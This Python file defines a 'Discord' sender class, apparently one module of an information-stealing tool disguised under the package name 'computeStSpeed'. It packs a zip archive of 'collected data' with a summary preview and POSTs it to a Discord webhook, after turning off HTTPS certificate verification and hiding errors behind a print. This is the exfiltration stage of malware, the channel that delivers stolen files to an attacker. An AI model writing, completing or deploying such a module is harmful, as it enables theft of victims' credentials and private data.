from io import BytesIO
from typing import Tuple, Union
from urllib.request import Request, urlopen

from computeStSpeed.abstract import AbstractSender


class Discord(AbstractSender):
    """
    Sender for the Discord.
    """
    def __init__(self, webhook: str):
        super().__init__()

        self.__webhook = webhook

    def __get_sender_data(self) -> Tuple[Union[str, bytes], ...]:
        """
        Gets data to send.

        Parameters:
        - None.

        Returns:
        - tuple: A tuple of content type, body, and Discord webhook.
        """
        content_type, body = self._encoder.encode(
            [("content", self.__preview)],
            [("file", f"{self.__zip_name}.zip", self.__data)]
        )

        return content_type, body

    def __send_archive(self) -> None:
        """
        Sends the data.

        Parameters:
        - None.

        Returns:
        - None.
        """
        content_type, body = self.__get_sender_data()
        query = Request(method="POST", url=self.__webhook, data=body)

        query.add_header("User-Agent", self._config.UserAgent)
        query.add_header("Content-Type", content_type)

        urlopen(query)

    def run(self, zip_name: str, data: BytesIO, preview: str) -> None:
        """
        Launches the sender module.

        Parameters:
        - zip_name [str]: Archive name.
        - data [BytesIO]: BytesIO object.
        - preview [str]: Collected data summary.

        Returns:
        - None.
        """
        self.__zip_name = zip_name
        self.__data = data
        self.__preview = preview

        try:

            self._create_unverified_https()
            self.__send_archive()

        except Exception as e:
            print(f"[Discord sender]: {repr(e)}")
